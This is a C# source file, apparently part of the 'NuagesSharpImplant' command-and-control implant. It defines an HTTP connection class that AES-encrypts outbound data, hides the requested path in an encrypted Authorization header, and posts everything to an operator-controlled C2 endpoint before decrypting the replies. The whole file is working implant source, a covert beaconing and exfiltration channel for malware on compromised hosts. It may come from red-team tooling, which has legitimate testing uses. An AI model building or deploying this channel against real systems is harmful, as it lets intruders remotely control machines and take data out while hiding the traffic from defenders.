using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using NuagesSharpImplant.Utils;


namespace NuagesSharpImplant.Connections
{
   
    class HTTPAES256Connection : NuagesC2Connection
    {
        private string connectionString;

        private string handler = "HTTPAES256";

        private AESHelper aes;

        public int refreshrate;

        public int buffersize;

        public HTTPAES256Connection(string connectionString, string password, int buffersize, int refreshrate)
        {
            this.aes = new AESHelper(password);

            this.connectionString = connectionString;

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;

        }

        public bool supportsBinaryIO() {

            return true;
        }

        public string getConnectionString()
        {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler + "|" + this.connectionString;
        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }

        public void setRefreshRate(int refreshrate)
        {
            this.refreshrate = refreshrate;
        }

        public void setBufferSize(int buffersize)
        {
               this.buffersize = buffersize;
        }

        public string POST(string url, string body) {
            return Encoding.ASCII.GetString(POST(url, Encoding.ASCII.GetBytes(body)));
        }

        public byte[] POST(string url, byte[] body)
        {
            byte[] byteArray = this.aes.EncryptBytes(body);

            byte[] EncUrl = this.aes.EncryptString(url);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.connectionString);

            request.Method = "POST";

            UTF8Encoding encoding = new UTF8Encoding();

            request.Headers.Add("Authorization", Convert.ToBase64String(EncUrl, 0, EncUrl.Length));
            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/x-www-form-urlencoded";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    MemoryStream ms = new MemoryStream();
                    byte[] buffer = new byte[16384];
                    int bytesRead;
                    while ((bytesRead = responseStream.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        ms.Write(buffer, 0, bytesRead);
                    }
                    byte[] bytes = ms.ToArray();
                    return this.aes.DecryptBytes(bytes);
                }
            }
        }
    }
}
